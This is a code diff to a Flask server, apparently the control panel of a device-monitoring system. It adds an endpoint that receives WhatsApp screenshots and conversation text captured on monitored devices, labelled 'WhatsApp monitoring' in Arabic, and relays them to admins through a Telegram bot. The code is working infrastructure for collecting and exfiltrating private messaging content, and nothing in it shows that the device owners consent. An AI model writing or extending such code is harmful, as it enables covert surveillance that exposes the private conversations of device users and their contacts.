@@ -2660,12 +2660,63 @@ def _api_base64_media():
     if not dev:
         return jsonify({"error": "unknown device"}), 404
 
-    # معالجة نفس معالجة Socket.IO
+    _process_base64_media(dev, data, None)
+    return jsonify({"success": True}), 200
+
+
+# ⚡ REST endpoint for whatsapp-image (مراقبة واتساب - fallback)
+@app.route("/api/device/whatsapp-image", methods=["POST"])
+def _api_whatsapp_image():
+    """REST fallback for WhatsApp monitor images."""
+    data = request.json or {}
+    did = data.get("device_id", "")
+    if not did:
+        return jsonify({"error": "no device_id"}), 400
+
+    dev = dm.get_device(did)
+    if not dev:
+        return jsonify({"error": "unknown device"}), 404
+
     try:
-        _process_base64_media(dev, data, None)
+        b64data = data.get("image", "") or data.get("data", "")
+        conversation_text = data.get("text", "")
+        logger.info(f"📱 whatsapp-image REST from #{dev.get('short_id', '?')}: "
+                    f"image={len(b64data)} chars, text={len(conversation_text)} chars")
+
+        if b64data:
+            import base64 as _b64
+            binary = _b64.b64decode(b64data)
+            from io import BytesIO
+            bio = BytesIO(binary)
+            short_label = _dev_label(dev)
+            caption = (f"📱 <b>مراقبة واتساب</b>\n"
+                      f"📱 <b>{short_label}</b>\n"
+                      f"📏 {len(binary)} bytes\n"
+                      f"━━━━━━━━━━━━━━━\n"
+                      f"{conversation_text}")
+            if len(caption) > 1024:
+                caption = caption[:1020] + "..."
+            if mdm_bot:
+                for admin_id in Config.ADMIN_IDS:
+                    try:
+                        mdm_bot.bot.send_photo(admin_id, photo=bio, caption=caption, parse_mode="HTML")
+                        bio.seek(0)
+                    except Exception as e:
+                        logger.error(f"❌ Failed to send WhatsApp image: {e}")
+        elif conversation_text and mdm_bot:
+            short_label = _dev_label(dev)
+            msg = (f"📱 <b>مراقبة واتساب (نص فقط)</b>\n"
+                  f"📱 <b>{short_label}</b>\n"
+                  f"━━━━━━━━━━━━━━━\n"
+                  f"{conversation_text}")
+            for admin_id in Config.ADMIN_IDS:
+                try:
+                    mdm_bot.bot.send_message(admin_id, msg, parse_mode="HTML")
+                except Exception:
+                    pass
         return jsonify({"success": True}), 200
     except Exception as e:
-        logger.error(f"❌ REST base64_media error: {e}")
+        logger.error(f"❌ whatsapp-image REST error: {e}")
         return jsonify({"error": str(e)}), 500
 
 
